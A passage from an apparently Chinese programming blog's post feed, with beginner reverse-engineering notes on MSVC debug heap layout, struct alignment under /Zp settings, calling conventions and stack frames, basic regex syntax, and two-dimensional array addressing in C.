property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_DEBUG</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">malloc</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token function">_malloc_dbg</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> _CLIENT_BLOCK<span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></li><li><p>在调用堆栈窗口找到  <code>mainCRTStartup</code>,跟进，在<code>_heap_init(0)</code>处<code>F9</code>下断点，跟进<code>_heap_init</code>,找到<code>HeapCreate</code><br><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210720190144.png"></p></li><li><p><code>void *realloc( void *memblock, size_t size );</code></p></li><li><p><code>void *_realloc_dbg( void *userData, size_t newSize, int blockType, const char *filename, int linenumber );</code></p><ul><li><p>userData<br>  那一块堆<br>  Pointer to the previously allocated memory block</p></li><li><p>newSize<br>  新大小<br>  Requested size for reallocated block (bytes)</p></li><li><p>blockType<br>  Requested type for reallocated block: _CLIENT_BLOCK or _NORMAL_BLOCK</p></li><li><p>filename<br>  Pointer to name of source file that requested realloc operation or NULL</p></li><li><p>linenumber<br>  Line number in source file where realloc operation was requested or NULL</p></li></ul></li></ul><p><img src="./medias/detail/load.gif" data-original="https://raw.githubusercontent.com/RyzeZR/blog/main/note-img/20210720225545.png"><br><img src="./medias/detail/load.gif" data-original="https://raw.githubusercontent.com/RyzeZR/blog/main/note-img/20210720230851.png"></p><h4 id="简要解析堆内存结构"><a href="#简要解析堆内存结构" class="headerlink" title="简要解析堆内存结构"></a>简要解析堆内存结构</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;crtdbg.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">_DEBUG</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">malloc</span><span class="token expression"><span class="token punctuation">(</span>n<span class="token punctuation">)</span> <span class="token function">_malloc_dbg</span><span class="token punctuation">(</span>n<span class="token punctuation">,</span> _NORMAL_BLOCK<span class="token punctuation">,</span><span class="token constant">__FILE__</span><span class="token punctuation">,</span><span class="token constant">__LINE__</span><span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span><span class="token keyword">struct</span> <span class="token class-name">tagHeap</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> szHeap<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">ShowByHeapInfo</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagHeap</span><span class="token operator">*</span> pStructHeap<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span><span class="token punctuation">(</span>pStructHeap<span class="token operator">-&gt;</span>szHeap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">8</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">ShowByHeapData</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagHeap</span><span class="token operator">*</span> pStructHeap<span class="token punctuation">,</span> <span class="token class-name">size_t</span> size<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">32</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">32</span> <span class="token operator">+</span> size<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>      <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span><span class="token punctuation">(</span>pStructHeap<span class="token operator">-&gt;</span>szHeap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">4</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\r\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token function">ShowByHeapEnd</span><span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagHeap</span><span class="token operator">*</span> pStructHeap<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">size_t</span> i<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span>i <span class="token operator">=</span> <span class="token number">35</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">39</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%02x "</span><span class="token punctuation">,</span><span class="token punctuation">(</span>pStructHeap<span class="token operator">-&gt;</span>szHeap<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token number">999</span><span class="token punctuation">;</span>    <span class="token comment">//     //指针p的地址</span><span class="token comment">//     printf("%08x\r\n",p);</span><span class="token comment">//     //p所在堆的起始地址，两者相差0x2字节</span><span class="token comment">//     printf("%08x\r\n",(unsigned char*)p - 0x20);</span>    <span class="token keyword">struct</span> <span class="token class-name">tagHeap</span> <span class="token operator">*</span>StructHeap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">struct</span> <span class="token class-name">tagHeap</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>p <span class="token operator">-</span> <span class="token number">0x20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>StructHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%08x\r\n"</span><span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowByHeapInfo</span><span class="token punctuation">(</span>StructHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowByHeapData</span><span class="token punctuation">(</span>StructHeap<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">ShowByHeapEnd</span><span class="token punctuation">(</span>StructHeap<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210721031541.png"></p>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>结构体内存结构观察</title>
      <link href="posts/58422.html"/>
      <url>posts/58422.html</url>
      
        <content type="html"><![CDATA[<h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stddef.h&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">GetOffSet</span><span class="token expression"><span class="token punctuation">(</span>s<span class="token punctuation">,</span>m<span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>s <span class="token operator">*</span><span class="token punctuation">)</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span>m<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>push<span class="token punctuation">)</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span></span></span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_tagStructTest</span><span class="token punctuation">{</span>    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> m_unsignedint<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">char</span> m_unsignedchar<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">double</span> m_db<span class="token punctuation">;</span>    bool m_bool<span class="token punctuation">;</span>    <span class="token keyword">float</span> m_float<span class="token punctuation">;</span>    <span class="token keyword">unsigned</span> <span class="token keyword">short</span> <span class="token keyword">int</span> m_short<span class="token punctuation">;</span>    <span class="token keyword">int</span> m_int<span class="token punctuation">;</span><span class="token punctuation">}</span>tag<span class="token punctuation">,</span><span class="token operator">*</span>PTAG<span class="token punctuation">;</span> <span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">pack</span><span class="token punctuation">(</span>pop<span class="token punctuation">)</span></span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>     tag Mystruct <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token number">1234</span><span class="token punctuation">,</span>        <span class="token string">"hell"</span><span class="token punctuation">,</span>        <span class="token number">65.0</span><span class="token punctuation">,</span>        true<span class="token punctuation">,</span>        <span class="token number">3.14f</span><span class="token punctuation">,</span>        <span class="token number">1111</span><span class="token punctuation">,</span>        <span class="token number">999</span>    <span class="token punctuation">}</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span><span class="token function">offsetof</span><span class="token punctuation">(</span>tag<span class="token punctuation">,</span>m_int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%d\r\n"</span><span class="token punctuation">,</span><span class="token function">GetOffSet</span><span class="token punctuation">(</span>tag<span class="token punctuation">,</span>m_int<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    PTAG pMytag <span class="token operator">=</span> <span class="token operator">&amp;</span>Mystruct<span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"pause"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>在上述代码中定义了一个结构体，它一共有7个成员：</p><table><thead><tr><th align="center">成员类型</th><th align="center">成员名称</th><th align="center">大小</th><th align="center">偏移（ZP1）</th><th align="center">偏移（ZP2）</th><th align="center">偏移（ZP8）</th></tr></thead><tbody><tr><td align="center">unsigned int</td><td align="center">m_unsignedint</td><td align="center">4字节</td><td align="center">0</td><td align="center">0</td><td align="center">0</td></tr><tr><td align="center">unsigned char[5]</td><td align="center">m_unsignedchar</td><td align="center">5字节</td><td align="center">4</td><td align="center">4</td><td align="center">4</td></tr><tr><td align="center">double</td><td align="center">m_db</td><td align="center">8字节</td><td align="center">9</td><td align="center">10</td><td align="center">16</td></tr><tr><td align="center">bool</td><td align="center">m_bool</td><td align="center">1字节</td><td align="center">17</td><td align="center">18</td><td align="center">24</td></tr><tr><td align="center">float</td><td align="center">m_float</td><td align="center">4字节</td><td align="center">18</td><td align="center">20</td><td align="center">28</td></tr><tr><td align="center">unsigned short</td><td align="center">m_short</td><td align="center">2字节</td><td align="center">22</td><td align="center">24</td><td align="center">32</td></tr><tr><td align="center">int</td><td align="center">m_int</td><td align="center">4字节</td><td align="center">24</td><td align="center">26</td><td align="center">36</td></tr><tr><td align="center"></td><td align="center"></td><td align="center"></td><td align="center">28</td><td align="center">30</td><td align="center">40</td></tr></tbody></table><p>编译选项<code>/ZP1 (2 4 8 16)</code> 1 Byte 2 Byte4 Byte 8 Byte 16 Byte</p><p><em><strong>*结构体内存对齐*</strong></em></p><p><strong>————–</strong></p><ul><li><p>设编译对齐值为Zp</p></li><li><p>设结构体成员的地址和结构体首地址之差为offset</p></li><li><p>设结构体成员类型为 member type必须满足：</p></li></ul><p> <code>offset % min(Zp,sizeof(member type)) == 0</code></p><ul><li>定义结构体自身的对齐值为 <code>StructAlig</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">StructAlig <span class="token operator">=</span> <span class="token function">max</span><span class="token punctuation">(</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>menber1 type<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>menber2 type<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>menberEnd type<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>设整个结构体的空间长度为<code>size</code></li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">size <span class="token operator">%</span> <span class="token function">min</span><span class="token punctuation">(</span>Zp<span class="token punctuation">,</span>StructAlig<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="编译选项为ZP1"><a href="#编译选项为ZP1" class="headerlink" title="编译选项为ZP1"></a>编译选项为ZP1</h4><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/image-20210718172958975.png" style="zoom:67%;"><h4 id="编译选项ZP2"><a href="#编译选项ZP2" class="headerlink" title="编译选项ZP2"></a>编译选项ZP2</h4><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718175115.png" style="zoom:67%;"><h4 id="编译选项ZP8"><a href="#编译选项ZP8" class="headerlink" title="编译选项ZP8"></a>编译选项ZP8</h4><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718175645.png" style="zoom:67%;"><p><strong>Winhex查看8字字节对齐的结构体信息</strong></p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718180501.png" style="zoom: 67%;">]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>函数调用内存结构简要分析</title>
      <link href="posts/14982.html"/>
      <url>posts/14982.html</url>
      
        <content type="html"><![CDATA[<h3 id="函数调用流程"><a href="#函数调用流程" class="headerlink" title="函数调用流程"></a>函数调用流程</h3><ol><li>按调用约定传递参数<br>1.1. 调用约定 调用方（caller）需要和被调方（callee）作出以下约定：<ol><li>参数的传递方向</li><li>参数的传输媒介（寄存器 or 栈）</li><li>函数返回值的位置</li><li>释放参数空间的负责方，有且仅有一方去释放参数空间</li></ol></li></ol><hr><p><code>_cdecl</code>: 参数使用栈空间传递，从右往左，函数返回值在寄存器，由调用方负责释放参数空间</p><p><code>_stdcall</code>: 参数使用栈空间传递，从右往左，函数返回值在寄存器，由<strong>被</strong>调用方负责释放参数空间<br><code>_fastcall</code>: 左数前两个参数使用寄存器传递，其他参数使用栈空间传递，函数返回值在寄存器，由<strong>被</strong>调用方负责释放参数空间<br>[scode type=”share”]<code>_cdecl</code>为默认，<code>_stdcall</code>是标准 约定，<code>_fastcall</code> windows下实现[/scode]</p><ol start="2"><li>保存返回地址</li><li>保存调用方的栈信息</li><li>更新当前栈底到栈顶（把当前栈顶作为被调方的栈底）</li><li>为局部变量申请栈空间（抬高栈顶）</li><li>保存寄存器环境（把即将使用的寄存中的原值存放在栈中）</li><li><ul><li>如果编译选项带有 /ZI ，则将局部变量空间初始化为<code>ox CCCC CCCC</code></li></ul></li></ol><hr><hr><ol start="8"><li>执行函数体</li><li>恢复寄存器环境</li><li>释放局部变量</li><li>恢复调用方栈信息（栈底）</li></ol><h4 id="进入main函数之前"><a href="#进入main函数之前" class="headerlink" title="进入main函数之前"></a>进入main函数之前</h4><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045212.png" alt="image.png"></p><h4 id="进入main函数"><a href="#进入main函数" class="headerlink" title="进入main函数"></a>进入main函数</h4><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045229.png" alt="image.png"></p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045244.png" alt="image.png"></p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045301.png" alt="image.png"></p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045317.png" alt="image.png"></p><p><img src="./medias/detail/load.gif" data-original="https://cdn.jsdelivr.net/gh/RyzeZR/blog/note-img/20210718045335.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言入门 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础正则语法</title>
      <link href="posts/42609.html"/>
      <url>posts/42609.html</url>
      
        <content type="html"><![CDATA[<h2 id="正则表达式语法"><a href="#正则表达式语法" class="headerlink" title="正则表达式语法:"></a>正则表达式语法:</h2><ul><li>   a|b         匹配 a 或 b</li><li>   gr(a|e)y         匹配 gray 或 grey</li><li>   .         匹配任一字符</li><li>   [abc]         匹配任一字符: a 或 b 或 c</li><li>   [^abc]         匹配任一字符, 但不包括 a, b, c</li><li>   [a-z]         匹配从 a 到 z 之间的任一字符</li><li>   [a-zA-Z]         匹配从 a 到 z, 及从 A 到 Z 之间的任一字符</li><li>   ^         匹配文件名的头部</li><li>   $         匹配文件名的尾部</li><li>   ( )         匹配标记的子表达式</li><li>   \n         匹配第 nth 个标记的子表达式, nth 代表 1 到 9</li><li>   \b         匹配字词边界</li><li><ul><li><pre><code>    匹配前一项内容 0 或多次</code></pre></li></ul></li><li>   ?         匹配前一项内容 0 或 1 次</li><li><ul><li><pre><code>    匹配前一项内容 1 或多次</code></pre></li></ul></li><li>   *?         匹配前一项内容 0 或多次 (懒人模式)</li><li>   +?         匹配前一项内容 1 或多次 (懒人模式)</li><li>   {x}         匹配前一项内容 x 次</li><li>   {x,}         匹配前一项内容 x 或多次</li><li>   {x,y}         匹配前一项内容次数介于 x 和 y 之间</li><li>   \         特殊转义字符</li></ul>]]></content>
      
      
      <categories>
          
          <category> CR逆向学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 正则 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>二(维)维数组与指针</title>
      <link href="posts/13736.html"/>
      <url>posts/13736.html</url>
      
        <content type="html"><![CDATA[<h2 id="指针与多维数组"><a href="#指针与多维数组" class="headerlink" title="指针与多维数组"></a>指针与多维数组</h2><ul><li><strong>数组名是第 0个元素的指针常量</strong></li><li><strong>n维数组的元素是n-1维的 数组</strong></li><li><strong>对任何变量取地址（&amp;）得到该类型的指针</strong></li></ul><h3 id="数组寻址公式"><a href="#数组寻址公式" class="headerlink" title="数组寻址公式"></a>数组寻址公式</h3><p><strong>例：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> ary<span class="token punctuation">[</span>N<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token comment">//其中N代表常量</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="ary-n-int-ary-sizeof-int-n"><a href="#ary-n-int-ary-sizeof-int-n" class="headerlink" title="ary[n] = (int)ary + sizeof(int) * n"></a><code>ary[n] = (int)ary + sizeof(int) * n</code></h2><h2 id="设二维数组-type-ary-N-M"><a href="#设二维数组-type-ary-N-M" class="headerlink" title="设二维数组 type ary[N][M]"></a>设二维数组 <code>type ary[N][M]</code></h2><h2 id="amp-ary-x-int-ary-sizeof-type-M-x"><a href="#amp-ary-x-int-ary-sizeof-type-M-x" class="headerlink" title="&amp;ary[x] = (int)ary + sizeof(type[M]) * x"></a><code>&amp;ary[x] = (int)ary + sizeof(type[M]) * x</code></h2><h2 id="amp-ary-x-y-int-ary-x-sizeof-type-y"><a href="#amp-ary-x-y-int-ary-x-sizeof-type-y" class="headerlink" title="&amp;ary[x][y] = (int)ary[x] + sizeof(type) * y"></a><code>&amp;ary[x][y] = (int)ary[x] + sizeof(type) * y</code></h2><p><strong>推导公式：</strong></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token operator">&amp;</span>ary<span class="token punctuation">[</span>x<span class="token punctuation">]</span><span class="token punctuation">[</span>y<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ary<span class="token punctuation">[</span>x<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">*</span> y <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ary <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">[</span>M<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">*</span> y <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ary <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">*</span> M <span class="token operator">*</span> x <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span> <span class="token operator">*</span> y <span class="token operator">=</span>  <span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span>ary <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>type<span class="token punctuation">)</span><span class="token operator">*</span><span class="token punctuation">(</span>M<span class="token operator">*</span>x <span class="token operator">+</span> y<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="代码示例："><a href="#代码示例：" class="headerlink" title="代码示例："></a><strong>代码示例：</strong></h2><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> ary<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">,</span>           <span class="token comment">//ary[0]</span>        <span class="token punctuation">{</span><span class="token number">10</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">,</span><span class="token number">30</span><span class="token punctuation">,</span><span class="token number">40</span><span class="token punctuation">}</span><span class="token punctuation">,</span>       <span class="token comment">//ary[1]</span>        <span class="token punctuation">{</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token number">300</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">}</span>    <span class="token comment">//ary[2] </span>    <span class="token punctuation">}</span>         <span class="token comment">/*    ** 数组名是第 0个元素的指针常量    ** n维数组的元素是n-1维的 数组    ** 对任何变量取地址（&amp;）得到该类型的指针    */</span>    <span class="token comment">// 数组名是第 0个元素的指针常量</span>    <span class="token comment">// 2维数组的元素是1维数组</span>    <span class="token comment">// int ary[3][4]的元素是 int[4]</span>    <span class="token comment">// ary是int[4]类型的指针常量</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span>ary<span class="token punctuation">)</span><span class="token punctuation">;</span>           <span class="token comment">//19ff00  int[4]类型的指针</span>        <span class="token comment">// int ary[3][4]的元素是 int[4]</span>    <span class="token comment">// 对ary取内容,*ary得到int[4]一维数组</span>    <span class="token comment">// *ary是int类型的指针常量</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span><span class="token operator">*</span>ary<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token comment">//19ff10</span>        <span class="token comment">// 任何类型的变量取地址得到该类型的指针</span>    <span class="token comment">// &amp;ary取地址得到int[3][4]类型的指针</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\r\n"</span><span class="token punctuation">,</span><span class="token operator">&amp;</span>ary<span class="token 